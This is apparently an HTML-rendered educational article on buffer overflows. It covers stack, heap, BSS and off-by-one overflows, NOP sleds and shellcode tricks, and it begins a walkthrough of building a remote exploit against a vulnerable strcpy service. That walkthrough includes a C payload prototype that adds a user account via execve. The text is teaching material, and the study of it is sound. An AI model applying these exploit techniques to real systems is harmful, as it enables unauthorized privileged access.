$('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack19-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack19-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack19-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2024-12-16-buffer-overflows/stack19.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack20-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack20-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack20-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2024-12-16-buffer-overflows/stack20.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack21-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack21-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack21-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2024-12-16-buffer-overflows/stack21.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack22-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack22-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack22-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2024-12-16-buffer-overflows/stack22.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> </swiper-container> </div> <h1 id="buffer-overflows">Buffer Overflows</h1> <h2 id="classification">Classification</h2> <p>Broadly speaking, there are four generations of buffer overflows that can be used to compromise a system. This work focuses on classic stack-based overflows and off-by-one overflows, but for completeness, we will also briefly mention BSS overflows and heap overflows.</p> <h2 id="bss-overflows">BSS Overflows</h2> <p>As mentioned previously, uninitialized global and static variables are stored in the BSS segment. Unlike the stack, the BSS segment grows upward, meaning that a buffer overflow might overwrite higher memory addresses. Because the BSS segment does not store administrative information like return addresses (as the stack does), this type of vulnerability is more difficult for attackers to exploit.</p> <p>However, attackers can sometimes overwrite pointers in the BSS segment to redirect program flow (though this is relatively uncommon) or manipulate file pointers (which is somewhat more likely). Successfully manipulating a file pointer could, for instance, allow an attacker to alter system files (e.g., by modifying <code class="language-plaintext highlighter-rouge">/etc/passwd</code>).</p> <h2 id="heap-overflows">Heap Overflows</h2> <p>On the heap, functions such as <code class="language-plaintext highlighter-rouge">malloc()</code> can dynamically allocate memory at runtime. Like the BSS segment, the heap grows toward higher addresses. Along with the requested memory, certain administrative information about the allocated block is also stored on the heap. Because this administrative information is always placed directly adjacent to the allocated buffer, it can be overwritten during a heap overflow, often causing the program to crash.</p> <p>As with BSS overflows, manipulating program flow via heap overflows is challenging, but under certain conditions it is possible to overwrite any memory address in the process‚Äôs memory space (e.g., return addresses on the stack). Many operating systems prevent execution of code in the heap area.</p> <h2 id="classic-stack-based-buffer-overflows">Classic Stack-Based Buffer Overflows</h2> <p>Stack overflows are among the most frequently encountered buffer overflow vulnerabilities. As far back as 1996, Aleph One (alias Elias Levy) published an article titled <strong>‚ÄúSmashing the Stack for Fun and Profit,‚Äù</strong> which examined this type of overflow in detail. Since both data and return addresses reside on the stack, stack overflows can present significant security risks. An attacker may be able to place executable code on the stack and then divert the program flow so that this malicious code is executed.</p> <p>The simplest way to exploit a stack overflow is to fill the vulnerable buffer with random data, forcing the program to crash. This kind of attack, known as a <strong>Denial of Service (DoS)</strong> attack, can be especially damaging for network services because it makes them unavailable. If the program generates a coredump on crashing, attackers may gain further insights that can aid in planning a more extensive attack. However, a DoS attack is often the least harmful method from the attacker‚Äôs perspective.</p> <p>More sophisticated attackers typically aim to hijack program flow and inject their own code, potentially granting them elevated privileges. This is especially straightforward with stack overflows, since the stack holds return addresses for all active functions. By overwriting these addresses, attackers can redirect execution. We will revisit the example from the previous section in a slightly modified form to demonstrate this.</p> <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">foo</span><span class="p">(</span><span class="kt">int</span> <span class="n">x</span><span class="p">,</span> <span class="kt">int</span> <span class="n">y</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span> <span class="p">{</span>
	<span class="kt">char</span> <span class="n">buff2</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
	<span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
	<span class="n">i</span> <span class="o">=</span> <span class="n">x</span> <span class="o">+</span> <span class="n">y</span><span class="p">;</span>
	<span class="n">strcpy</span><span class="p">(</span><span class="n">buff2</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span>
 	<span class="k">return</span> <span class="n">i</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
	<span class="kt">char</span> <span class="n">buff</span><span class="p">[</span><span class="mi">30</span><span class="p">];</span>
	<span class="n">foo</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="n">buff</span><span class="p">);</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure> <p></p> <p>If the <code class="language-plaintext highlighter-rouge">buff2</code> buffer in the <code class="language-plaintext highlighter-rouge">foo()</code> function is not protected against overflow, the saved frame pointer (FP1) and then the return address (RIP) will be overwritten (see the previous figure). The attacker‚Äôs goal is to overwrite at least the higher addresses of the buffer‚Äîand beyond‚Äîwith an address of their choosing.</p> <p>The fact that the saved frame pointer is also overwritten generally does not concern the attacker. Once the program flow is hijacked, the frame pointer is often no longer needed or will be set to a new value. In fact, there are procedures (detailed later) that allow direct access to payload data without relying on the frame pointer.</p> <p>In the simplest attack scenario, the attacker manipulates the return address to point to existing program code that is normally never executed. This might be interesting, for instance, in a program that only calls certain functions after a successful password check.</p> <p>A second approach is to place custom code directly into the overflowed buffer and have the return address point to it. A piece of malicious code that modifies program flow and executes injected code is generally called an <strong>exploit</strong>. Exploits consist of two parts:</p> <ol> <li><strong>Injection Vector</strong> ‚Äì Forces the buffer to overflow and branches execution to the payload.</li> <li><strong>Payload</strong> ‚Äì The malicious code itself, which can vary depending on the attacker‚Äôs goal. Typical payloads might open a shell (executing with the permissions of the vulnerable program), modify password files, release a virus, or install a network sniffer.</li> </ol> <p>Crafting a functional payload is often non-trivial. Because it must already be in machine code, the attacker needs knowledge of the target‚Äôs processor architecture and operating system to prepare code that will run successfully.</p> <h3 id="the-zero-byte-problem">The Zero Byte Problem</h3> <p>A common challenge arises because many string functions (particularly copy operations) terminate upon encountering a null byte. If the vulnerable program relies on such a string function, the payload must not contain a null byte (<code class="language-plaintext highlighter-rouge">\0</code>). Although the actual machine instructions typically do not include zero bytes, their operands often do. For instance, loading zero into a register might involve an instruction like:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nf">movl</span> <span class="kc">$</span><span class="mh">0x0</span><span class="p">,</span> <span class="o">%</span><span class="nb">ebx</span></code></pre></figure> <p>Because the operand is a literal, the null byte appears directly in the code. To ensure the exploit functions properly, direct usage of null literals should be avoided whenever possible; other instructions can be employed to set a register to zero. The next section outlines a method for circumventing these null bytes.</p> <h3 id="relative-addressing">Relative Addressing</h3> <p>The payload often contains data‚Äîsuch as strings‚Äîrequired during execution. Handling these data requires their absolute addresses. However, because the frame pointer is overwritten, relative addressing via the frame pointer is not an option. The attacker, not knowing the exact location of the data on the stack, must rely on a clever approach to determine absolute addresses. One possible payload structure that accomplishes this is discussed below:</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2018-02-05-buffer-overflows/relativeAddr-480.webp 480w,/assets/img/2018-02-05-buffer-overflows/relativeAddr-800.webp 800w,/assets/img/2018-02-05-buffer-overflows/relativeAddr-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2018-02-05-buffer-overflows/relativeAddr.png" class="img-fluid rounded z-depth-1 imgcenter" width="400px" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> <figcaption class="caption"> <b>Figure 4:</b> Relative Adressing. </figcaption> </figure> <p>As shown in the figure, a <code class="language-plaintext highlighter-rouge">CALL</code> instruction is placed directly in front of the payload data, and a <code class="language-plaintext highlighter-rouge">JMP</code> instruction appears as the first statement in the code. When executed, the program flow first branches from the <code class="language-plaintext highlighter-rouge">JMP</code> to the <code class="language-plaintext highlighter-rouge">CALL</code>. This works because the <code class="language-plaintext highlighter-rouge">JMP</code> instruction can perform relative jumps. Once <code class="language-plaintext highlighter-rouge">CALL</code> is executed, the CPU automatically saves the return address (the location of the next instruction) onto the stack.</p> <p>In our case, there is no further instruction after the <code class="language-plaintext highlighter-rouge">CALL</code>‚Äîjust data. Consequently, the <code class="language-plaintext highlighter-rouge">CALL</code> instruction writes the absolute address of the data area to the stack. In the next step, this address can be retrieved from the stack (using <code class="language-plaintext highlighter-rouge">POPL %ESI</code>) and then used freely by the exploit.</p> <hr/> <h3 id="nop-sliding">NOP-Sliding</h3> <p>Overflow buffers are often significantly larger than the actual payload. Part of the buffer (the higher addresses) will be overwritten with the desired return address, while the remainder is available for the payload. To improve the odds of a successful attack, it‚Äôs essential to use this memory space strategically.</p> <p>However, there‚Äôs a catch: The attacker typically does not know the exact (absolute) address of the overflow buffer on the stack; only an estimate is possible. This estimate is usually fairly precise but not exact‚Äîmost programs only place a few hundred or thousand bytes onto the stack. Achieving perfect precision is not feasible, and if the guessed address is off, the processor might jump into the middle of the payload or even land somewhere else entirely.</p> <p>To solve this, the leftover space in the overflow buffer can be filled with <strong>No Operation (NOP)</strong> instructions. The actual payload follows the NOP block. If the NOP block is large enough, a guessed return address has a comparatively high likelihood of landing somewhere in it. When the function eventually returns, execution starts somewhere within the NOP block, slides through the no-ops, and then proceeds to the actual payload code. This process is known as <strong>NOP-sliding</strong>.</p> <p>A typical exploit structure would look like this:</p> <ol> <li><strong>NOP Sled</strong> (large block of no-ops)</li> <li><strong>Payload</strong> (malicious code)</li> <li><strong>Overwritten Return Address</strong> (pointing into the NOP sled)</li> </ol> <p>Upon function return, the instruction pointer hits the NOP block, seamlessly slides through the NOPs, and finally executes the payload.</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2018-02-05-buffer-overflows/nop-sliding-480.webp 480w,/assets/img/2018-02-05-buffer-overflows/nop-sliding-800.webp 800w,/assets/img/2018-02-05-buffer-overflows/nop-sliding-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2018-02-05-buffer-overflows/nop-sliding.png" class="img-fluid rounded z-depth-1 imgcenter" width="400px" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> <figcaption class="caption"> <b>Figure 5:</b> NOP sliding. </figcaption> </figure> <h2 id="off-by-one-and-frame-pointer-overwrites">Off-by-One and Frame Pointer Overwrites</h2> <p>Off-by-one overflows occur when a data buffer is overwritten by exactly one byte. The most common cause is an incorrectly specified loop termination condition. The following example illustrates this:</p> <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="mi">1</span>	<span class="kt">void</span> <span class="nf">foo</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span> <span class="p">{</span>
<span class="mi">2</span>		<span class="kt">char</span> <span class="n">buff</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
<span class="mi">3</span>		<span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
<span class="mi">4</span>		<span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">100</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="c1">// Error: termination condition is off by one</span>
<span class="mi">5</span>			<span class="n">buff</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">str</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
<span class="mi">6</span>	<span class="p">}</span></code></pre></figure> <p>Here, the <code class="language-plaintext highlighter-rouge">for</code> loop iterates from 0 to 100, attempting to copy one extra element into <code class="language-plaintext highlighter-rouge">buff</code>. Since <code class="language-plaintext highlighter-rouge">buff</code> only has space for 100 bytes, the subsequent memory location is overwritten.</p> <p>In this particular example, <code class="language-plaintext highlighter-rouge">buff</code> is allocated on the stack because it is a local variable. Not all off-by-one errors necessarily involve stack arrays, but those that do can lead to frame pointer overwrites and other critical security risks.</p> <p>Now consider swapping lines 2 and 3. This change would cause the loop to overwrite the least significant byte (LSB) of <code class="language-plaintext highlighter-rouge">i</code>, due to the little-endian byte representation used by IA-32/x86 processors.</p> <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="mi">1</span>	<span class="kt">void</span> <span class="nf">foo</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span> <span class="p">{</span>
<span class="mi">2</span>		<span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
<span class="mi">3</span>		<span class="kt">char</span> <span class="n">buff</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
<span class="mi">4</span>		<span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;=</span><span class="mi">100</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="c1">// Here is an error!!!</span>
<span class="mi">5</span>			<span class="n">buff</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">str</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
<span class="mi">6</span>	<span class="p">}</span></code></pre></figure> <p></p> <p>In this example, if the least significant byte (LSB) of the loop counter <code class="language-plaintext highlighter-rouge">i</code> is overwritten with a value less than or equal to 100, an infinite loop could potentially occur. However, this particular bug does not allow the attacker to manipulate program flow. Such manipulation is only possible if the buffer is declared as the first statement of the function.</p> <p>When entering a function, the current frame pointer is saved on the stack, and space for local variables is then reserved. An off-by-one overflow would overwrite only the LSB of the saved frame pointer on the stack. Although this might not immediately disrupt the current function (since it‚Äôs not yet using the saved frame pointer), issues can arise once the function prepares to return. The <code class="language-plaintext highlighter-rouge">leave</code> instruction reloads the saved frame pointer into <code class="language-plaintext highlighter-rouge">EBP</code>, potentially causing problems in the calling function (for instance, because local variables there are accessed relative to <code class="language-plaintext highlighter-rouge">EBP</code>).</p> <p>To examine this more closely, we can extend the example with a <code class="language-plaintext highlighter-rouge">main()</code> function calling the flawed <code class="language-plaintext highlighter-rouge">foo()</code>:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">1</span>	<span class="nf">void</span> <span class="nv">main</span><span class="p">()</span> <span class="err">{</span>
<span class="err">2</span>		<span class="nf">char</span> <span class="nv">str</span><span class="p">[</span><span class="mi">101</span><span class="p">]</span><span class="c1">;</span>
<span class="err">3</span>		<span class="nf">foo</span><span class="p">(</span><span class="nv">str</span><span class="p">)</span><span class="c1">;</span>
<span class="err">4</span>	<span class="err">}</span>


<span class="err">1</span>	<span class="nl">main:</span>
<span class="err">2</span>        <span class="nf">pushl</span>   <span class="o">%</span><span class="nb">ebp</span>
<span class="err">3</span>        <span class="nf">movl</span>    <span class="o">%</span><span class="nb">esp</span><span class="p">,</span> <span class="o">%</span><span class="nb">ebp</span>
<span class="err">4</span>        <span class="nf">subl</span>    <span class="kc">$</span><span class="mi">120</span><span class="p">,</span> <span class="o">%</span><span class="nb">esp</span>
<span class="err">5</span>        <span class="nf">subl</span>    <span class="kc">$</span><span class="mi">12</span><span class="p">,</span> <span class="o">%</span><span class="nb">esp</span>
<span class="err">6</span>        <span class="nf">leal</span>    <span class="o">-</span><span class="mi">120</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span> <span class="o">%</span><span class="nb">eax</span>
<span class="err">7</span>        <span class="nf">pushl</span>   <span class="o">%</span><span class="nb">eax</span>
<span class="err">8</span>        <span class="nf">call</span>    <span class="nv">foo</span>
<span class="err">9</span>        <span class="nf">addl</span>    <span class="kc">$</span><span class="mi">16</span><span class="p">,</span> <span class="o">%</span><span class="nb">esp</span>
<span class="err">10</span>       <span class="nf">leave</span>
<span class="err">11</span>       <span class="nf">ret</span></code></pre></figure> <p></p> <p>As mentioned earlier, after calling <code class="language-plaintext highlighter-rouge">foo()</code> (i.e., at line 9 in the assembly code), the <code class="language-plaintext highlighter-rouge">EBP</code> register (frame pointer) holds an incorrect value. Let‚Äôs analyze the <code class="language-plaintext highlighter-rouge">main()</code> function‚Äôs code starting from line 9:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">9</span>   <span class="nf">addl</span>    <span class="kc">$</span><span class="mi">16</span><span class="p">,</span> <span class="o">%</span><span class="nb">esp</span></code></pre></figure> <p>After the function call, the stack pointer must be adjusted to remove the passed parameters. In this case, we only passed a single four-byte pointer. However, because line 5 reserved extra (unused) memory, the stack pointer is moved by a significantly larger offset.</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">10</span>  <span class="nf">leave</span> </code></pre></figure> <p>The instruction in line 10 is logically equivalent to:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nf">movl</span> <span class="o">%</span><span class="nb">ebp</span><span class="p">,</span> <span class="o">%</span><span class="nb">esp</span>
<span class="nf">popl</span> <span class="o">%</span><span class="nb">ebp</span></code></pre></figure> <p>At this point, the current frame pointer is copied into the stack pointer, and the previously saved frame pointer is popped into <code class="language-plaintext highlighter-rouge">EBP</code>. Normally, after <code class="language-plaintext highlighter-rouge">leave</code>, <code class="language-plaintext highlighter-rouge">ESP</code> would point to the return address of <code class="language-plaintext highlighter-rouge">main()</code>. However, due to the incorrect value in <code class="language-plaintext highlighter-rouge">EBP</code>, this is no longer the case in our example.</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">11</span>  <span class="nf">ret</span></code></pre></figure> <p>Line 11 (<code class="language-plaintext highlighter-rouge">ret</code>) is effectively equivalent to:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nf">popl</span> <span class="o">%</span><span class="nv">eip</span></code></pre></figure> <p>Because the stack pointer does not point to the correct return address, <code class="language-plaintext highlighter-rouge">EIP</code> is loaded with an invalid address. The final <code class="language-plaintext highlighter-rouge">ret</code> instruction loads the return address into the instruction register. However, because the stack pointer no longer points to the correct return address, it loads a value that typically triggers an error and prematurely terminates the process.</p> <p><strong>Summary of the Example</strong><br/> An off-by-one overflow in the <code class="language-plaintext highlighter-rouge">foo()</code> function overwrote the least significant byte of <code class="language-plaintext highlighter-rouge">main()</code>‚Äôs saved frame pointer. Consequently, when <code class="language-plaintext highlighter-rouge">foo()</code> exits, the corrupted value is loaded back into <code class="language-plaintext highlighter-rouge">EBP</code>, causing <code class="language-plaintext highlighter-rouge">ESP</code> in <code class="language-plaintext highlighter-rouge">main()</code> to shift incorrectly just before returning. As a result, the actual return address is not loaded into the instruction register, and the process terminates with an error since no valid instruction resides at the calculated address.</p> <p>Naturally, this raises the question: can we exploit the vulnerability so that the saved frame pointer is manipulated in such a way that a malicious program (injected earlier) executes upon exiting <code class="language-plaintext highlighter-rouge">main()</code>?</p> <p>Before delving into that possibility, let‚Äôs outline the stack structure for this example:</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2018-02-05-buffer-overflows/off-by-one1-480.webp 480w,/assets/img/2018-02-05-buffer-overflows/off-by-one1-800.webp 800w,/assets/img/2018-02-05-buffer-overflows/off-by-one1-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2018-02-05-buffer-overflows/off-by-one1.png" class="img-fluid rounded z-depth-1 imgcenter" width="750px" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> <figcaption class="caption"> <b>Figure 6:</b> Off-by-One example. </figcaption> </figure> <p>As shown in the figure, it‚Äôs possible to manipulate the least significant byte (LSB) of the saved frame pointer (FP1). Ideally, you want FP1 to point into the memory area occupied by <code class="language-plaintext highlighter-rouge">buff</code>, where you could store a custom return address. Consequently, the LSB of FP1 should be as small as possible to increase the likelihood that FP1 eventually points where you want it.</p> <p>But what if the original value of FP1 is already quite small? In that scenario, even setting the LSB of FP1 to zero may not be enough to redirect it into the <code class="language-plaintext highlighter-rouge">buff</code> field. Additionally, in our example, the problem is compounded by the fact that the main function creates a relatively large array, making the distance between FP2 and FP1 quite large.</p> <p>If more than 247 bytes are placed on the stack in <code class="language-plaintext highlighter-rouge">main()</code>, it becomes impossible to manipulate FP1 in a way that it will point to <code class="language-plaintext highlighter-rouge">buff</code>. In this example, <code class="language-plaintext highlighter-rouge">main()</code> allocates 101 bytes for the <code class="language-plaintext highlighter-rouge">str</code> array, plus 4 bytes each for the return address (RIP) and the saved frame pointer (FP1). For a successful manipulation, the LSB of FP1 must be at least <code class="language-plaintext highlighter-rouge">146</code> (calculated as 255 - 101 - 4 - 4).</p> <p>In summary, the fewer bytes the calling function (<code class="language-plaintext highlighter-rouge">main()</code>) places on the stack‚Äîand the smaller the LSB of the saved frame pointer‚Äîthe greater the chance of successfully manipulating the saved FP.</p> <p>Henceforth, we assume that the saved frame pointer can indeed be manipulated to point into <code class="language-plaintext highlighter-rouge">buff</code>. To execute a program successfully under these conditions, you should provide the following input to <code class="language-plaintext highlighter-rouge">foo()</code>, which gets copied into <code class="language-plaintext highlighter-rouge">buff</code> (see the blue-highlighted section in the figure):</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2018-02-05-buffer-overflows/off-by-one2-480.webp 480w,/assets/img/2018-02-05-buffer-overflows/off-by-one2-800.webp 800w,/assets/img/2018-02-05-buffer-overflows/off-by-one2-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2018-02-05-buffer-overflows/off-by-one2.png" class="img-fluid rounded z-depth-1 imgcenter" width="750px" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> <figcaption class="caption"> <b>Figure 7:</b> Another off-by-one example. </figcaption> </figure> <p>The payload address is chosen so that it points to the NOPs region. By manipulating the least significant byte of the saved frame pointer (FP1), we expect FP1 to end up pointing to the payload address area. When <code class="language-plaintext highlighter-rouge">main()</code> exits, this address is then loaded into the instruction register, triggering the execution of the payload.</p> <h3 id="bug-of-the-gcc-compiler">Bug of the GCC compiler</h3> <p>Testing an exploit that was supposed to exploit this off-by-one vulnerability caused an unexpected problem that ultimately turned out to be a bug of the GNU compiler GCC 3.x. For clarification, the assembly code of the following function should be provided:</p> <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="mi">1</span>	<span class="kt">void</span> <span class="nf">foo</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
<span class="mi">2</span>		<span class="kt">char</span> <span class="n">buff</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
<span class="mi">3</span>	<span class="p">}</span></code></pre></figure> <p> Output of the compiler:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">1</span> <span class="nl">foo:</span>
<span class="err">2</span>        <span class="nf">pushl</span>   <span class="o">%</span><span class="nb">ebp</span>
<span class="err">3</span>        <span class="nf">movl</span>    <span class="o">%</span><span class="nb">esp</span><span class="p">,</span> <span class="o">%</span><span class="nb">ebp</span>
<span class="err">4</span>        <span class="nf">subl</span>    <span class="kc">$</span><span class="mi">120</span><span class="p">,</span> <span class="o">%</span><span class="nb">esp</span>
<span class="err">5</span>        <span class="nf">leave</span>
<span class="err">6</span>        <span class="nf">ret</span></code></pre></figure> <p></p> <p>In line 4 of the assembly code 120 bytes are reserved for the array buff, but according to the C-code the array should be only 100 bytes in size. So, a whole 20 bytes are reserved in excess. Also with other buffer sizes, in almost all cases more memory was allocated than actually necessary. This compiler bug makes it impossible to exploit off-by-one vulnerabilities. In order to achieve a useful result, the For loop termination condition of the foo function has been modified to overwrite the LSB of the saved frame pointer. The corresponding C source code of the example can be found on GitHub.</p> <h1 id="detailed-example-of-creating-an-exploit">Detailed Example of Creating an Exploit</h1> <h2 id="basic-principles">Basic Principles</h2> <p>After discussing classic stack overflows in detail, we will now develop a more extensive exploit that leverages a buffer overflow vulnerability to create a user with root privileges. This scenario assumes the following conditions:</p> <ol> <li>The vulnerable program has been started with elevated (root) privileges.</li> <li>The vulnerable program is network-enabled, allowing attackers to exploit it remotely from another machine.</li> </ol> <p>Further details are beyond this scope; the fully commented source code is available on GitHub. The relevant vulnerability in the source code looks like this:</p> <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">calc</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span> <span class="p">{</span>
	<span class="kt">char</span> <span class="n">buff</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
	<span class="n">strcpy</span> <span class="p">(</span><span class="n">buff</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span>
<span class="p">}</span></code></pre></figure> <p>After reading input from an external host, the <code class="language-plaintext highlighter-rouge">calc()</code> function is called and given that input. Inside <code class="language-plaintext highlighter-rouge">calc()</code>, a 512-byte buffer (<code class="language-plaintext highlighter-rouge">buff</code>) is allocated, and the string is copied into it using <code class="language-plaintext highlighter-rouge">strcpy()</code>. Because there is no bounds checking, an attacker can trivially cause a buffer overflow.</p> <p>For instance, a simple DoS (Denial of Service) attack could be executed by sending any input larger than 512 bytes, causing the program to crash. However, since the program runs with root privileges, if an attacker succeeds in hijacking the process, they gain elevated permissions on the target system. The generous 512-byte buffer also makes it easy to embed malicious code directly into <code class="language-plaintext highlighter-rouge">buff</code>, potentially along with a NOP sled to increase the likelihood of a successful exploit.</p> <p>We also know that the target system runs on an IA-32/x86 processor. The injected code must be in machine code form, and several steps are involved to produce it:</p> <ol> <li><strong>Implement the desired functions in a C program.</strong></li> <li><strong>Disassemble the C program to analyze the generated machine instructions.</strong></li> <li><strong>Develop a custom assembly program.</strong></li> <li><strong>Assemble the custom program and extract its machine code.</strong></li> <li><strong>Integrate this code into a working exploit.</strong></li> </ol> <h2 id="implementation-of-the-desired-functions-using-a-c-program">Implementation of the Desired Functions Using a C Program</h2> <p>For simplicity, we will create a standard user on the target system. Later, the code can be adapted to create a user with root privileges.</p> <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="mi">1</span>	<span class="kt">void</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
<span class="mi">2</span>	    <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span>
<span class="mi">3</span>	    <span class="n">name</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="s">"/usr/sbin/adduser"</span><span class="p">;</span>
<span class="mi">4</span>	    <span class="n">name</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="s">"markus"</span><span class="p">;</span>
<span class="mi">5</span>	    <span class="n">name</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="s">"-p"</span><span class="p">;</span>
<span class="mi">6</span>	    <span class="n">name</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="s">"$1$7√èv√ôLK√è¬µ$gSUKG6RALzRA8ryROcTsG0"</span><span class="p">;</span>
<span class="mi">7</span>	    <span class="n">name</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="mi">8</span>	    <span class="n">execve</span><span class="p">(</span><span class="n">name</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">name</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="mi">9</span>	<span class="p">}</span></code></pre></figure> <p>This program creates a user named <code class="language-plaintext highlighter-rouge">"markus"</code> with the specified (already encrypted) password. The encryption value is provided in <code class="language-plaintext highlighter-rouge">name[3]</code>.</p> <p>In lines 2‚Äì7, we prepare the parameter list for the <code class="language-plaintext highlighter-rouge">execve</code> function. This list must be an array of null-terminated strings, ending with a <code class="language-plaintext highlighter-rouge">NULL</code> pointer. When <code class="language-plaintext highlighter-rouge">execve</code> is called in line 8, the current program is replaced with the new program code specified by the first parameter (<code class="language-plaintext highlighter-rouge">"/usr/sbin/adduser"</code>). The second parameter, our argument list, is passed to the main function of the program being executed.</p> <h2 id="analysis-of-the-disassembled-c-program">Analysis of the disassembled C Program</h2> <p>After the C source code has been generated, the output of the GCC compiler can be examined in more detail. First, the assembly code of the main function will be examined.</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nf">Dump</span> <span class="nv">of</span> <span class="nv">assembly</span> <span class="nv">code</span> <span class="nv">for</span> <span class="nv">function</span> <span class="nv">main</span><span class="p">:</span>
